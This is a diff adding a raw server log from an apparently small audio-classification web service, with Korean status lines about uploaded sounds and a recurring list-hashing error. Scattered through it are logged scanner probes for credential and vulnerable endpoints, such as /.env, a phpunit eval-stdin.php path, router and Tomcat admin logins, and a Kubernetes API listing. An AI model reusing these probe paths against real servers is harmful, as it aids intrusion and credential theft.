@@ -1,0 +1,822 @@
+INFO:     Started server process [202699]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:80 (Press CTRL+C to quit)
+INFO:     135.125.217.54:55148 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:55912 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     66.249.68.62:51422 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     66.249.68.34:60925 - "GET / HTTP/1.1" 307 Temporary Redirect
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9223222732543945
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:57224 - "POST /uploadFile HTTP/1.1" 200 OK
+INFO:     66.249.79.4:51945 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     66.249.79.2:51909 - "GET /privacy HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.6929401755332947
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:57254 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8835924863815308
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:57256 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9254990816116333
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:57258 - "POST /uploadFile HTTP/1.1" 200 OK
+INFO:     95.214.235.205:60318 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:35132 - "POST / HTTP/1.1" 405 Method Not Allowed
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.6765027046203613
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:57272 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.534489631652832
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:57274 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.819286584854126
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:57310 - "POST /uploadFile HTTP/1.1" 200 OK
+INFO:     45.134.140.181:5715 - "GET /apis/apps/v1/namespaces/kube-system/daemonsets HTTP/1.1" 404 Not Found
+INFO:     34.76.158.233:39048 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [202699]
+INFO:     Started server process [203114]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:80 (Press CTRL+C to quit)
+INFO:     123.208.222.94:33886 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     95.214.235.205:51648 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:54324 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     84.17.46.174:36786 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     193.32.162.159:46472 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     135.125.217.54:60788 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:33326 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     71.6.232.25:57290 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     185.254.196.115:58986 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:32822 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     183.136.225.9:57032 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     183.136.225.9:18499 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     183.136.225.9:34945 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     1.14.7.100:60008 - "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:46572 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:47286 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     135.125.217.54:58756 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:59312 - "POST / HTTP/1.1" 405 Method Not Allowed
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9924652576446533
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44492 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7377129197120667
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44532 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.6245197653770447
+판단 결과는 차량 사이렌 소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44534 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7656431794166565
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44538 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.964527428150177
+판단 결과는 차량 사이렌 소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44562 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8118142485618591
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44626 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8701351881027222
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44630 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.5966793894767761
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44632 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9180192947387695
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44640 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.5235737562179565
+판단 결과는 남성 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44642 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9439926147460938
+판단 결과는 차량 사이렌 소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44646 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.945390522480011
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44650 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8309476971626282
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44652 - "POST /uploadFile HTTP/1.1" 200 OK
+INFO:     95.214.235.205:50672 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:54056 - "POST / HTTP/1.1" 405 Method Not Allowed
+로그 정상적으로 저장
+unhashable type: 'list'
+INFO:     220.86.11.124:44718 - "POST /uploadLog HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9524140954017639
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44750 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8616555333137512
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44856 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7101151943206787
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44858 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.6459532976150513
+판단 결과는 박수소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44860 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7567548751831055
+판단 결과는 비명소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44862 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.6097228527069092
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44864 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9621431827545166
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44866 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.47823476791381836
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44870 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7547274231910706
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44874 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.46164917945861816
+판단 결과는 박수소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44910 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.6679625511169434
+판단 결과는 남성 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44912 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.6538388133049011
+판단 결과는 비명소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44914 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9080746173858643
+판단 결과는 비명소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44916 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7858395576477051
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44930 - "POST /uploadFile HTTP/1.1" 200 OK
+로그 정상적으로 저장
+unhashable type: 'list'
+INFO:     220.86.11.124:44934 - "POST /uploadLog HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8764814138412476
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:44936 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.5587562918663025
+판단 결과는 비명소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44938 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.5457366704940796
+판단 결과는 비명소리
+정상적으로 반환됨
+INFO:     220.86.11.124:44940 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.42684346437454224
+판단 결과는 비명소리
+정상적으로 반환됨
+INFO:     220.86.11.124:45020 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8166835904121399
+판단 결과는 차량 사이렌 소리
+정상적으로 반환됨
+INFO:     220.86.11.124:45022 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.6125357747077942
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:45110 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7698971629142761
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:45114 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.963713526725769
+판단 결과는 차량 사이렌 소리
+정상적으로 반환됨
+INFO:     220.86.11.124:45118 - "POST /uploadFile HTTP/1.1" 200 OK
+로그 정상적으로 저장
+unhashable type: 'list'
+INFO:     220.86.11.124:45176 - "POST /uploadLog HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8199367523193359
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:45178 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.43477490544319153
+판단 결과는 박수소리
+정상적으로 반환됨
+INFO:     220.86.11.124:45180 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7460036277770996
+판단 결과는 차량 사이렌 소리
+정상적으로 반환됨
+INFO:     220.86.11.124:45182 - "POST /uploadFile HTTP/1.1" 200 OK
+INFO:     105.112.183.241:2300 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     105.112.183.241:6644 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     105.112.183.241:7070 - "GET /debug/default/view?panel=config HTTP/1.1" 404 Not Found
+INFO:     105.112.183.241:2236 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     109.237.97.180:53464 - "GET /.env HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     183.136.225.32:44281 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     183.136.225.32:8680 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     183.136.225.32:17979 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     183.136.225.32:33794 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:59328 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:60092 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     137.184.51.77:54984 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     137.184.51.77:54996 - "GET /client/get_targets HTTP/1.1" 404 Not Found
+INFO:     195.133.40.61:44356 - "GET /explore HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:58454 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:59230 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     135.125.217.54:51946 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:52720 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     95.214.235.205:42868 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:45896 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     209.141.35.17:47332 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+INFO:     20.115.47.129:49658 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:56244 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:56958 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     167.94.138.45:39318 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     167.94.138.45:53580 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     167.94.138.45:35888 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     208.80.194.42:63862 - "GET / HTTP/1.0" 307 Temporary Redirect
+INFO:     143.244.50.172:34376 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     95.214.235.205:42730 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:45832 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     94.102.61.10:33840 - "GET /images/favicon.ico HTTP/1.1" 404 Not Found
+INFO:     94.102.61.10:34634 - "GET /images/logo-ios.png HTTP/1.1" 404 Not Found
+INFO:     94.102.61.10:35524 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     34.204.189.32:37782 - "GET /robots.txt HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     34.204.189.32:37782 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     34.204.189.32:37782 - "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 404 Not Found
+INFO:     34.204.189.32:37782 - "GET /99vt HTTP/1.1" 404 Not Found
+INFO:     34.204.189.32:37782 - "GET /gate.php HTTP/1.1" 404 Not Found
+INFO:     34.204.189.32:37838 - "GET /99vu HTTP/1.1" 404 Not Found
+INFO:     34.204.189.32:37782 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     135.125.217.54:57896 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:58472 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     198.235.24.32:59498 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     135.125.217.54:57088 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:57880 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     143.244.50.172:50826 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+INFO:     167.248.133.118:35776 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     167.248.133.118:34488 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     167.248.133.118:41274 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     182.43.148.98:33786 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     14.116.150.68:35092 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     113.142.141.105:60430 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     192.241.236.20:48086 - "GET /portal/redlion HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:51248 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:51986 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     198.199.105.127:37646 - "GET /actuator/health HTTP/1.1" 404 Not Found
+INFO:     192.241.215.18:41854 - "GET /hudson HTTP/1.1" 404 Not Found
+INFO:     165.232.174.66:54184 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+INFO:     54.226.202.1:58100 - "GET /app-ads.txt HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:33126 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:33828 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     38.242.128.76:8122 - "GET /v2/ HTTP/1.1" 404 Not Found
+INFO:     38.242.128.76:39887 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     38.242.128.76:46173 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:33814 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:36298 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     37.44.238.231:52842 - "POST /boaform/admin/formLogin HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.240.236.116:53546 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     34.64.82.72:58624 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     34.64.82.68:49094 - "GET /app-ads.txt HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:51194 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:51952 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     94.102.61.10:45654 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     162.142.125.7:40400 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     162.142.125.7:52826 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     162.142.125.7:34366 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     95.214.235.205:35040 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:37844 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     109.237.98.226:46678 - "GET /.env HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     143.244.50.172:59256 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:41618 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:42476 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     128.1.248.26:51956 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.99.94.181:48566 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     167.99.94.181:49490 - "GET /client/get_targets HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:48844 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:51210 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     142.4.218.114:39547 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     178.32.197.94:51567 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     1.14.7.100:58856 - "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 Not Found
+INFO:     188.165.87.99:60097 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:42962 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:43588 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     207.46.13.125:3072 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     188.165.87.106:37781 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:60494 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:39906 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     109.237.98.53:46206 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     35.195.93.98:38124 - "GET / HTTP/1.1" 307 Temporary Redirect
+로그 정상적으로 저장
+unhashable type: 'list'
+INFO:     220.86.11.124:42524 - "POST /uploadLog HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.4881971776485443
+판단 결과는 남성 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:42692 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8960432410240173
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:42804 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.7457417249679565
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:42962 - "POST /uploadFile HTTP/1.1" 200 OK
+INFO:     34.64.82.72:47448 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     34.64.82.71:55590 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     34.64.82.68:37788 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     34.64.82.64:35514 - "GET /privacy HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.287997305393219
+판단 결과는 비명소리
+정상적으로 반환됨
+INFO:     220.86.11.124:42810 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8932214379310608
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:42812 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.4213625192642212
+판단 결과는 박수소리
+정상적으로 반환됨
+INFO:     220.86.11.124:42814 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9463343024253845
+판단 결과는 차량 사이렌 소리
+정상적으로 반환됨
+INFO:     220.86.11.124:42818 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.9180079698562622
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:42820 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.8556428551673889
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:42824 - "POST /uploadFile HTTP/1.1" 200 OK
+음원 불러오기 완료
+mfcc 구하기 완료
+모델 불러오기 완료
+Softmax의 최댓값은 0.759556770324707
+판단 결과는 아이 대화
+정상적으로 반환됨
+INFO:     220.86.11.124:42828 - "POST /uploadFile HTTP/1.1" 200 OK
+INFO:     135.125.217.54:56066 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:56836 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     135.125.217.54:60876 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:33356 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     45.95.55.150:47012 - "CONNECT ifconfig.me%3A443 HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:35998 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:36744 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     184.105.247.254:23590 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     184.105.247.254:56164 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     184.105.247.254:32830 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     192.241.209.56:39802 - "GET /manager/text/list HTTP/1.1" 404 Not Found
+INFO:     87.236.176.62:40597 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     20.22.233.146:55556 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     20.22.233.146:55575 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     149.129.167.69:44052 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     135.125.217.54:59668 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:60438 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     107.170.227.11:50040 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:57756 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:60958 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     190.92.159.48:34412 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:55652 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:58598 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     135.125.217.54:48366 - "GET /.env HTTP/1.1" 404 Not Found
